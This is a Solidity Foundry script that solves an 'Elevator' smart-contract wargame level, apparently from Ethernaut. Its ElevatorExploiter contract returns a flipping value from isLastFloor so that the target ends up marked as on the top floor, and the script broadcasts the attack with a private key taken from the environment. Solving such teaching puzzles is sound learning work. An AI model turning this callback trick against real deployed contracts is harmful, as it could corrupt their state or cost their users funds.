pragma solidity ^0.8.0;
import "../instances/Ilevel11.sol";
import "forge-std/Test.sol";

contract Level11 is Test {
    Elevator level11 = Elevator(0x3B4651f4dF04094Af27b0Fc50B6AfCaE0E936149);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        ElevatorExploiter exploiter = new ElevatorExploiter();
        exploiter.exploit(address(level11));
        require(level11.top() == true, "Level11: not on top floor");
        vm.stopBroadcast();
    }
}

contract ElevatorExploiter is Building {
    bool toggleFlag = true;

    function exploit(address _elevatorAddress) external {
        Elevator elevator = Elevator(_elevatorAddress);
        elevator.goTo(1);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        toggleFlag = !toggleFlag;
        return toggleFlag;
    }
}
